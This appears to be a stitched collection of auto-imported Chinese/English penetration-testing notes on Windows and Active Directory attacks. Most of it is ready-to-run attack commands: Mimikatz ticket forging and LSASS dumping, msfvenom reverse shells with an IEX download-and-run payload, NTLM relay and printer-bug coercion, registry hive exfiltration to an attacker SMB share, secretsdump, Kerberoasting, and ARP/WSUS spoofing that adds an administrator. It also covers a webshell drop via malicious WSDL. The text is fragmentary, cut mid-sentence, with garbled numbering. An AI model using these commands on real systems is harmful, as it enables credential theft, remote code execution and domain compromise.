Forms), namespaces declared in the WSDL (e.g., `xmlns:tns="http://host/service?x=@{...}"`) are copied verbatim into the SOAP envelope. Encoding payloads inside the namespace query string enables CSHTML Razor or PowerShell script drops without parameter control.These techniques powered the Barracuda Service Center RMM (CVE-2025-34392) exploit: an unauthenticated SOAP call supplied a malicious WSDL, set `soap12:address` to `file:///Program Files/.../SCMessaging/poc.aspx`, injected `<script runat="server">` via complex parameters, and uploaded a webshell that executed arbitrary `cmd.exe` commands.## Typical attack workflow1. Identify functionality that accepts a WSDL URL or otherwise lets users configure SOAP endpoints (e.g., Barracuda `InvokeRemoteMethod`, Ivanti EPM connectors, Umbraco 8 Forms datasources, PowerShell `New-WebServiceProxy`).2. Host a malicious WSDL whose `soap:address` points to a writable path or UNC share and whose schema definitions provide payload-friendly methods/types.3. Trigger the import/compilation. The target emits a proxy DLL with attacker-controlled constructor and methods.4. When the application invokes the generated method, the SOAP request is serialized and written to the attacker-specified path, embedding the payload.5. Execute the dropped file (browse to `poc.aspx?cmd=whoami`, load the CSHTML, or let PowerShell run the script) or replay captured NTLM material.## Detection & hunting- **Static analysis**: Grep for `ServiceDescriptionImporter`, `SoapHttpClientProtocol`, `HttpWebClientProtocol`, or `New-WebServiceProxy`. Trace how `Url` or WSDL inputs are sourced—anything user-controlled is a red flag.- **Runtime telemetry**: - Instrument proxy creation to log schemes; alert on `file`, `ftp`, or UNC values. - Monitor for the characteristic "Client found response content type of 'application/octet-stream'" errors after SOAP calls. - Watch for unexpected `.aspx/.cshtml/.ps1` writes under application directories performed by the web service identity.- **Network/file signals**: SMB connections initiated by web servers to attacker infrastructure, or sudden compilation of temporary proxy DLLs, often precede exploitation.## Mitigations- **Enforce transport validation** before invoking any `HttpWebClientProtocol`-derived proxy: # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Active Directory 攻击链 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/域与Windows/Movement 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Movement 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Movement 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Movement 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Movement、NTLM configuration、Kerberos configuration、Patch management、Access Management (IAM/PAM)；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页当前以概念和流程为主；后续实验时可补充最小复现命令和输出样例。 # 关键主题 Movement NTLM configuration Kerberos configuration Patch management Access Management (IAM/PAM) 凭据 Management Domain-level configuration and best-practices Networking, protocols and services Active Directory 域 证书服务 # 核心要点 Obsolete versions of this protocol (LM, LMv2 and NTLM (v1)) are disabled and NTLM (all versions) is disabled when possible. This allows to stay safe from NTLM 中继，NTLM capture and cracking and 哈希传递 attacks. krbtgt's 密码 has been changed in the last 6 months to prevent 黄金票据 持久化 attacks. From UNIX-like systems, this can be checked with Impacket's Get-ADUsers.py script. The RC4 etype is disabled for Kerberos to prevent overpass-the - 哈希 and NTLMv1 capture and cracking to 白银票据 attacks. This can be checked by attempting to obtain a TGT with an NT 哈希. No account is configured with Do not require Kerberos Pre - 认证 allowing for AS-REP Roasting attacks, or make sure those account have strong 密码 resistant to cracking. User accounts that have at least one ServicePrincipalName, hence vulnerable to Kerberoasting 服务票据离线爆破，have a strong 密码，resistant to cracking. Domain Controllers are patched against Kerberos sAMAccountName spoofing. MS14-068 is patched, preventing forging of powerful Kerberos tickets. Patches for NTLM tampering vulnerabilities (e.g. CVE-2019-1040, CVE-2019-1019, CVE-2019-1166) are applied to limit NTLM 中继 attacks. Latest security patched are applied (e.g. for ProxyLogon, ProxyShell, PrintNightmare, ...). Sensitive network shares are not readable by all users. A "need to know" policy is followed, preventing data leak and other. No account is configured with Kerberos 非约束委派 capabilities. No computer account has admin privileges over another one. This limits NTLM 中继 attacks. Caching of domain users is limited on workstations and avoided on servers to prevent credential dumping of LSA secrets from registry. Group Policy Preferences Passwords are not used. # 工具与参考入口 Impacket Get-ADUsers.py # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Active Directory 攻击链 Kerberos 票据攻击 AD CS 证书攻击 云身份与权限 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

This is achieved by marking the LSASS as a protected process. Activation of LSA Protection involves: This allows the dumping of the lsass.exe memory to a file, which can then be analyzed on another system to extract 凭据: Example: mimikatz "privilege::debug" "event::drop" exit The privilege::debug command ensures that Mimikatz operates with the necessary privileges to modify system services. Use the commands below as quick syntax reminders. The dedicated pages for golden tickets, silver tickets, diamond tickets, and over - 哈希传递 /pass-the-key contain the up-to-date AES/PAC/opsec nuances. Command: kerberos::golden /krbtgt: The NTLM 哈希 of the domain's KDC service account. /ptt: Directly injects the ticket into memory. /ticket: Saves the ticket for later use. Command: Similar to 黄金票据 but targets specific services. Other parameters similar to 黄金票据. Command: Similar to 黄金票据 but for trust relationships. /rc4: The NTLM 哈希 for the trust account. # 命令 / 载荷 / 操作片段 # 1. Counteracting SeDebugPrivilege Removal 12sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"sc start TrustedInstaller # 2. Counteracting SeDebugPrivilege Removal 123# privilege::debug# sekurlsa::minidump lsass.dmp# sekurlsa::logonpasswords # 3. 黄金票据 Creation 1mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit # 4. 白银票据 Creation 1mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit # 5. Trust Ticket Creation 1mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit # 6. Over - 哈希传递 / Pass-the-Key 123mimikatz "privilege::debug" "sekurlsa::ekeys" exitmimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exitmimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit # 7. Cloud 凭据 / Entra ID 123mimikatz "privilege::debug" "sekurlsa::cloudap" exitmimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exitmimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit # 工具与参考入口 adsecurity.org Pass the PRT The Hacker 工具 – Mimikatz modules Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Active Directory 攻击链 Kerberos 票据攻击 云身份与权限 CTF 取证隐写 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Create a computer account and use it for Kerberos RBCD attacks when leveraging owned accounts with sufficient permissions (i.e. ACEs like GenericAll, GenericWrite or WriteProperty) against a target machine Create a computer account and use it for a Kerberos 非约束委派 attack when leveraging owned accounts with sufficient permissions (i.e. the SeEnableDelegationPrivilege user right) Alternatively, it can be done manually with the Python library ldap3 (source): With ldapsearch (openldap (C)): # 命令 / 载荷 / 操作片段 # 1. Listing 12msfvenom -l payloads #Payloadsmsfvenom -l encoders #Encoders # 2. Common params when creating a shellcode 12345-b "\x00\x0a\x0d"-f c-e x86/shikata_ga_nai -i 5EXITFUNC=threadPrependSetuid=True #Use this to create a shellcode that will execute something with SUID # 3. 反弹 Shell 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe # 4. Bind Shell 1msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe # 5. Create User 1msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe # 6. CMD Shell 1msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe # 7. Execute Command 12msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exemsfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe # 8. Encoder 1msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe # 9. Embedded inside executable 1msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe # 10. 反弹 Shell 12msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elfmsfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf # 11. Bind Shell 1msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf # 12. SunOS (Solaris) 1msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf # 13. 反弹 Shell: 1msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho # 14. Bind Shell 1msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho # 15. But MS-RPRN abuse can be combined with WebClient abuse to elicit incoming authentications made over HTTP which heightens NTLM 中继 capabilities. The attacker needs a foothold on the domain (i.e. compromised account) for this attack to work since the coercion is operated through an RPC call in the SMB \pipe\spoolss named pipe through the IPC$ share. Remotely checking if the spooler is available can be done with SpoolerScanner (Powershell) or with rpcdump (Python). === SpoolerScanner In the situation where the tester doesn't have any 凭据，it is still possible to relay an 认证 and trigger the spooler service of a target via a SOCKS proxy. Nota bene: coerced NTLM authentications made over SMB restrict the possibilites of NTLM 中继. For instance, an "unsigning cross-protocols relay attack" from SMB to LDAP will only be possible if the target is vulnerable to CVE-2019-1040 or CVE-2019-1166. # 命令 / 载荷 / 操作片段 # 1. Practice 1printerbug.py 'DOMAIN'/'USER':'PASSWORD'@'TARGET' 'ATTACKER HOST' # 2. Practice 1rpcdump.py $TARGET | grep -A 6 "spoolsv" # 3. Practice 12Import-Module .\Get-SpoolStatus.ps1ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server} # 4. Practice 12ntlmrelayx.py -t smb://$TARGET -socksproxychains printerbug.py -no-pass 'DOMAIN'/'USER'@'TARGET' 'ATTACKER HOST' # 工具与参考入口 more info on the finding SpoolerScanner rpcdump printerbug SpoolSample # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/域与Windows/MS-RPC 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # MS-RPC 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 MS-RPC 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 MS-RPC 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：MS-RPC、Theory、Practice、Find exposed services、Null sessions；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 4 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 MS-RPC Theory Practice Find exposed services Null sessions 侦察 through interesting named pipes RID Cycling IObjectExporter(IOXIDResolver) Enumerate Domain users and computers # 核心要点 a network SMB pipe (listening ports are 139 & 445) RPC services over an SMB transport, i.e. port 445/TCP, are reachable through "named pipes"' (through the IPC$ share). There are many interesting named pipes that allow various operations from NULL sessions context, to local administrative context. \pipe\lsarpc: enumerate privileges, trust relationships, SIDs, policies and more through the LSA (Local Security Authority) \pipe\samr: enumerate domain users, groups and more through the local SAM database (only works pre Win 10 Anniversary) \pipe\svcctl: remotely create, start and stop services to execute commands (used by Impacket's psexec.py and smbexec.py) \pipe\atsvc: remotely create scheduled tasks to execute commands (used by Impacket's atexec.py) getdompwinfo: get 密码 policy # 命令 / 载荷 / 操作片段 # 1. Find exposed services 12345# with rpcdump.py (example with target port 135/TCP)rpcdump.py -port 135 "$TARGET"# with rpcdump.exe (example with target port 593/TCP)rpcdump.exe -p 593 "$TARGET" # 2. 侦察 through interesting named pipes 1rpcclient -c "command" -U "" -N "$TARGET" # 3. IObjectExporter(IOXIDResolver) 123456789python IOXIDResolver-ng.py -t "$TARGET"# OUTPUT EXEMPLE[*] Anonymous connection on MSRPC[+] Retriev Network Interfaces for 192.168.5.20...[+] ServerAlive2 methode find 3 interface(s)[+] aNetworkAddr addresse : DC01 (Hostname)[+] aNetworkAddr addresse : 192.168.5.20 (IPv4)[+] aNetworkAddr addresse : db69:ecdc:d85:1b54:1676:7fa4:f3fe:4249 (IPv6) # 4. Enumerate Domain users and computers 1python3 nauth.py -t "$TARGET" -u users_file.txt -f computers_file.txt # 工具与参考入口 psexec.py smbexec.py atexec.py wmiexec.py dcomexec.py rpcdump.py rpctools rpcclient ridenum ServerAlive2() IOXIDResolver-ng NauthNRPC # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

SAM and LSA secrets can be dumped either locally or remotely from the mounted registry hives. These secrets can also be extracted offline from the exported hives. Once the secrets are extracted, they can be used for various attacks, depending on the credential format. Impacket's reg.py (Python) script can also be used to do the same operation remotely for a UNIX-like machine. For instance, this can be used to easily escalate from a Backup Operator member to a Domain Admin by dumping a Domain Controller's secrets and use them for a DCSync. The attacker can start an SMB server, and indicate an UNC path including his IP address so that the hives get exported directly to his server. Impacket's secretsdump (Python) can be used to dump SAM and LSA secrets, either remotely, or from local files. For remote dumping, several 认证 methods can be used like 哈希传递 (LM/NTLM), or pass-the-ticket (Kerberos). NetExec (Python) can be used to remotely dump SAM and LSA secrets, on multiple hosts. It offers several 认证 methods like 哈希传递 (NTLM), or pass-the-ticket (Kerberos) # 命令 / 载荷 / 操作片段 # 1. Exfiltration 12345678910# start an SMB sharesmbserver.py -smb2support "someshare" "./"# save each hive manuallyreg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SAM' -o '\\ATTACKER_IPs\someshare'reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SYSTEM' -o '\\ATTACKER_IP\someshare'reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SECURITY' -o '\\ATTACKER_IP\someshare'# backup all SAM, SYSTEM and SECURITY hives at oncereg.py "domain"/"user":"password"@"target" backup -o '\\ATTACKER_IP\someshare' # 2. Exfiltration 123reg save HKLM\SAM "C:\Windows\Temp\sam.save"reg save HKLM\SECURITY "C:\Windows\Temp\security.save"reg save HKLM\SYSTEM "C:\Windows\Temp\system.save" # 3. Exfiltration 1BackupOperatorToDA.exe -d "domain" -u "user" -p "password" -t "target" -o "\\ATTACKER_IP\someshare" # 4. Exfiltration 123\system32\config\sam\system32\config\security\system32\config\system # 5. Secrets dump 1234567891011121314151617# Remote dumping of SAM & LSA secretssecretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'# Remote dumping of SAM & LSA secrets (pass-the-hash)secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'# Remote dumping of SAM & LSA secrets (pass-the-ticket)secretsdump.py -k 'DOMAIN/USER@TARGET'# Offline dumping of LSA secrets from exported hivessecretsdump.py -security '/path/to/security.save' -system '/path/to/system.save' LOCAL# Offline dumping of SAM secrets from exported hivessecretsdump.py -sam '/path/to/sam.save' -system '/path/to/system.save' LOCAL# Offline dumping of SAM & LSA secrets from exported hivessecretsdump.py -sam '/path/to/sam.save' -security '/path/to/security.save' -system '/path/to/system.save' LOCAL # 6. Secrets dump 1234567891011# Remote dumping of SAM/LSA secretsnetexec smb $TARGETS -d $DOMAIN -u $USER -p $PASSWORD --sam/--lsa# Remote dumping of SAM/LSA secrets (local user authentication)netexec smb $TARGETS --local-auth -u $USER -p $PASSWORD --sam/--lsa# Remote dumping of SAM/LSA secrets (pass-the-hash)netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash --sam/--lsa# Remote dumping of SAM/LSA secrets (pass-the-ticket)netexec smb $TARGETS --kerberos --sam/--lsa # 7. Secrets dump 1234567891011# Local dumping of SAM secrets on the targetlsadump::sam# Offline dumping of SAM secrets from exported hiveslsadump::sam /sam:'C:\path\to\sam.save' /system:'C:\path\to\system.save'# Local dumping of LSA secrets on the targetlsadump::secrets# Off

The ST is encrypted with the requested service account's NT 哈希. If an attacker has a valid TGT and knows a service (by its SAN or SPN), he can request a ST for this service and crack it offline later in an attempt to retrieve that service account's 密码. Unlike ASREProasting, this attack can only be carried out with a prior foothold (valid domain 凭据), except in the Kerberoasting 服务票据离线爆破 without pre - 认证 scenario. The Impacket script GetUserSPNs (Python) can perform all the necessary steps to request a ST for a service given its SPN (or name) and valid domain 凭据. The Kerberoasting 服务票据离线爆破 attack can be conducted without knowing any SPN of the target account, since a service ticket can be request for as long as the service's SAN (sAMAccountName) is known. (swarm.ptsecurity.com) Hashcat and JohnTheRipper can then be used to try cracking the 哈希. # 命令 / 载荷 / 操作片段 # 1. Practice 1hashcat -m 13100 kerberoastables.txt $wordlist # 6. Practice 1john --format=krb5tgs --wordlist=$wordlist kerberoastables.txt # 7. Kerberoasting 服务票据离线爆破 w/o pre - 认证 1GetUserSPNs.py -no-preauth "bobby" -usersfile "services.txt" -dc-host "DC_IP_or_HOST" "DOMAIN.LOCAL"/ # 8. Kerberoasting 服务票据离线爆破 w/o pre - 认证 123srv01cifs/srv02.domain.localcifs/srv02 # 9. Kerberoasting 服务票据离线爆破 w/o pre - 认证 1Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"DOMAIN.LOCAL" /dc:"DC01.DOMAIN.LOCAL" /nopreauth:"nopreauth_user" /spn:"target_service" # 工具与参考入口 Impacket GetUserSPNs swarm.ptsecurity.com NetExec pypykatz Rubeus Hashcat JohnTheRipper Charlie Cark implemented the pull request (#1413) https://en.hackndo.com/kerberos https://adsecurity.org/?p=2011 https://www.semperis.com/blog/new-attack-paths-as-requested-sts/ # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Kerberos 票据攻击 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

NTLM capture and NTLM 中继 : spoof an SMB server and reroute received SMB packets to internal capture or relay servers (rerouting technique). Besides the scenarios mentioned above, many network topologies exist and ARP poisoning attacks need to be carefully prepared based on that topology. Below are some common examples. One segment: the client, the server, and the attacker are on the same network segment. The ARP tables can be poisoned with the attacker spoofing either the client or the server. Three segments: all three machines are on different network segments. For both hijacking and relaying attacks, I'm not sure what can be done... :man shrugging: In order to forward packets, the system has to be prepared accordingly. The first step is to make sure the system firewall can effectively forward packets. The easiest way of achieving this is to write an ACCEPT policy in the FORWARD chain. any.proxy.dst address refers to the IP address the matched packets are to be sent to. For instance, when doing WSUS or DNS spoofing attacks in a rerouting technique mode, this option has to be set to the IP address of the attacker's server. wireshark, make sure forwarded packets appear twice, one with MAC 1 -> MAC 2, one with MAC 2 -> MAC 3 (1=victim, 2=attacker, 3=gateway) Make sure the attacker and the victim client are on the same subnet, I don't know how to operate when they are not make sure to run bettercap in a privileged 容器 with network host # 命令 / 载荷 / 操作片段 # 1. Networking 1iptables --policy FORWARD ACCEPT # 2. Scenarios examples 1python3 pywsus.py --host $network_facing_ip --port 8530 --executable /path/to/PsExec64.exe --command '/accepteula /s cmd.exe /c "net user testuser /add && net localgroup Administrators testuser /add"' # 3. Scenarios examples 1bettercap --iface $interface --caplet wsus_spoofing.cap # 4. Scenarios examples 123456789101112131415# quick recon of the networknet.probe on# set the ARP poisoningset arp.spoof.targets $client_ipset arp.spoof.internal trueset arp.spoof.fullduplex true# control logging and verbosityevents.ignore endpointevents.ignore net.sniff.mdns# start the modulesarp.spoof onnet.sniff on # 5. Combining ARP poisoning and IP spoofing to 绕过 firewall 12345678# As refered to above, IP forwarding need to be enabled otherwise attacker's machine will drop the packets not containing its IP address as destinationsysctl net.ipv4.ip_forward=1# Change the source port range of the attacker host, this is only to make sure port range size is the same as the one of the spoofed traffic (20000-30000)echo "40000 50000" > /proc/sys/net/ipv4/ip_local_port_range# Spoof the source IP address of the outgoing traffic and modify the source ports to tag the spoofed traffic.iptables -t nat -A POSTROUTING -s "ATTACKER_IP"/32 -o "NETWORK_INTERFACE" -p tcp -j SNAT --to-source "TARGET_IP":20000-30000# Identify the response to the spoofed traffic and change destination IP of the target to the one of the attacker's hostiptables -t nat -A PREROUTING -d "TARGET_IP"/32 -i "NETWORK_INTERFACE" -p tcp -m tcp --dport 20000:30000 -j DNAT --to-destination "ATTACKER_IP":40000-50000 # 6. Combining ARP poisoning and IP spoofing to 绕过 firewall 12# Launch the ARP poisoningarpspoof -i "NETWORK_INTERFACE" -t "TARGET_IP" -r "FIREWALL_IP" # 7. Combining ARP poisoning and IP spoofing to 绕过 firewall 1iptables -t nat -A POSTROUTING -o "NETWORK_INTERFACE" -j MASQUERADE # 8. Combining ARP poisoning and IP spoofing to 绕过 firewall 1iptables -t nat -I POSTROUTING -d "TARGET_IP" -j SNAT --to "MODIFIED_SOURCE_IP" # 工具与参考入口 bettercap arp.spoof any.proxy responder dnschef bettercap pywsus PCredz iptables arpspoof "Combining ARP poisoning and IP spoofing to 绕过 firewalls" article Llia Dafchev http:

So for the attack to succeed, we need to force the client to generate an AP-REQ for the target host and send it to us. Kerberos relay attacks are not as permissive as their NTLM versions. For the moment, only a few specific 利用 scenarios have been proven. In particular, it is important to note that, due to stricter configuration of exchange signatures (particularly for the HTTP protocol), relays to the LDAP service are, for the time being, virtually impossible by default. krbrelayx (Python) and KrbRelayEx (C#) are great 工具 for relaying Kerberos authentications. Those 工具 setup relay clients and relay servers waiting for incoming authentications. An interesting service for relaying authentications is the AD CS HTTP service, which by default is vulnerable to relay attacks as it does not enforce signing with HTTP, allowing an ESC8 to be exploited via Kerberos from a mitm6 DNS poisoning. DNS is used in Kerberos 认证 operations in Active Directory 域. In particular, it is used through Secure dynamic updates, which are used to keep DNS records synchronised with the IP addresses of dynamically addressed clients. Attackers can then answer those multicast or broadcast queries. The victims are then redirected to the attacker asking them to authenticate in order to access whatever they ask for. Their 认证 is then relayed. The following command will start LLMNR, NBTS and mDNS spoofing. Name resolution queries for the wpad server will be answered just like any other query. Fake 认证 servers (HTTP/S, SMB, SQL, FTP, IMAP, POP3, DNS, LDAP, ...) will capture NTLM hashes. Clear-Inveigh to clear the $inveigh hashtable Get-Inveigh to get data from the $inveigh hashtable The chart below sums up the expected behavior of cross-protocols relay attacks depending on the mitigations in place (original here). All the tests and results listed in the chart were made using Impacket's ntlmrelayx (Python). The following mindmap sums up the overall attack paths of NTLM 中继. Gabriel Prudhomme explains how to read it here: BHIS | Coercions and Relays – The First Cred is the Deepest (at 08:00). Session signing is a powerful but limited mitigation against NTLM 中继 that only SMB and LDAP can use. SMB signing works in a "least requirements" way. If neither the client or the server require signing, the session will not be signed (because of performance issues) LDAP signing works in a "most requirements" way. If both the client and the server support signing, then they will sign the session Since the session signing is negotiated during the NTLM 认证，why couldn't attackers tamper with the messages and unset the signing negotiation flags? Because there is a protection called MIC that prevents this. the user's NT 哈希 A Channel Binding 令牌 (CBT) when there is a TLS channel to bind to (HTTPS, LDAPS) It supports SMB2. It can be enabled with the -smb2support option It implements CVE-2019-1040 with the --remove-mic option, usually needed when attempting "cross-protocols unsigning relays" (e.g. SMB to SMB-with-required-signing, or SMB to LDAP/S). This option can also be used when NTLMv1 is allowed (NTLMv1 doesn't support MIC). It has the ability to attack multiple targets with the -tf option instead of -t, and the -w option can be set to watch the target file for changes and update target list automatically the target can be specified with a target protocol like ldap://target but the "all" keyword can be used (all://target). If the protocol isn't specified, it defaults to smb. # 命令 / 载荷 / 操作片段 # 1. Windows also uses that API for sensitive information like Wi-Fi passwords, certificates, RDP connection passwords, and many more. DonPAPI (Python) can also be used to remotely extract a user's DPAPI secrets more easily. It supports 哈希传递，pass-the-ticket and so on. On Windows systems Mimikatz (C) can be used to extract dpapi with lsadump::backupkeys, decrypt with dpapi::chrome and dpapi::cred or use specific master keys with dpapi::masterkey and sekurlsa::dpapi , using specified passwords or given sufficient privileges. The LaZagne (Python) project is a go-to reference from browser 凭据 dumping (among other awesome dumping features). # 命令 / 载荷 / 操作片段 # 1. Theory 1C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID # 2. Theory 12C:\Users\$USER\AppData\Local\Microsoft\Credentials\C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\ # 3. Practice 123456789# (not tested) Decrypt a master keydpapi.py masterkey -file "/path/to/masterkey_file" -sid $USER_SID -password $MASTERKEY_PASSWORD# (not tested) Obtain the backup keys & use it to decrypt a master keydpapi.py backupkeys -t $DOMAIN/$USER:$PASSWORD@$TARGETdpapi.py masterkey -file "/path/to/masterkey_file" -pvk "/path/to/backup_key.pvk"# (not tested) Decrypt DPAPI-protected data using a master keydpapi.py credential -file "/path/to/protected_file" -key $MASTERKEY # 4. This can be achieved in multiple ways but there is one that is to be avoided: setting the built-in Administrator's 密码 through Group Policies. Issue 1: the 密码 is set to be the same for every (set of) machine (s) the Group Policy applies to. If the attacker finds the admin's 哈希 or 密码，he can gain administrative access to all (or set of) machines. Issue 2: by default, knowing the built-in Administrator's 哈希 (RID 500) allows for powerful 哈希传递 attacks (read more). From UNIX-like systems, the Get-GPPPassword.py (Python) script in the impacket examples can be used to remotely parse .xml files and loot for passwords. Alternatively, searching for passwords can be done manually (or with Metasploit's smb enum gpp module), however it requires mounting the SYSVOL share, which can't be done through a Docker environment unless it's run with privileged rights. From Windows systems, the GPP 密码 can only be recovered from an authenticated (i.e. domain user) context (see impersonation). # 命令 / 载荷 / 操作片段 # 1. Practice 12345678# with a NULL sessionGet-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'# with cleartext credentialsGet-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'# pass-the-hashGet-GPPPassword.py -hashes 'LMhash':'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER' # 2. Practice 123456789101112131415161718# create the target directory for the mountsudo mkdir /tmp/sysvol# mount the SYSVOL sharesudo mount\ -o domain='domain.local'\ -o username='someuser'\ -o password='password'\ -t cifs\ '//domain_controller/SYSVOL'\ /tmp/sysvol# recursively look for "cpassword" in Group Policiessudo grep -ria cpassword /tmp/sysvol/'domain.local'/Policies/ 2>/dev/null# decrypt the string and recover the passwordpypykatz gppass j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhwgpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw # 3. Practice 12Import-Module .\Get-GPPPassword.ps1Get-GPPPassword # 4. Practice 1findstr /S cpassword %logonserver%\sysvol*.xml # 5. Practice 123451. decode from base642. decrypt from AES-256-CBC the following hex key/iv Key : [REDACTED_SECRET] IV : 00000000000000000000000000000003. decode from UTF-16LE # 工具与参考入口 Get-GPPPassword.py pypykatz gpp-decrypt PowerSploit Get-GPPPassword https://adsecurity.org/?p=2288 http://blog.carnal0wnage.com/2012/10/group-policy-preferences-and-getting.html https://podalirius.net/en/articles/exploiting-windows-group-policy-preferences/ # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

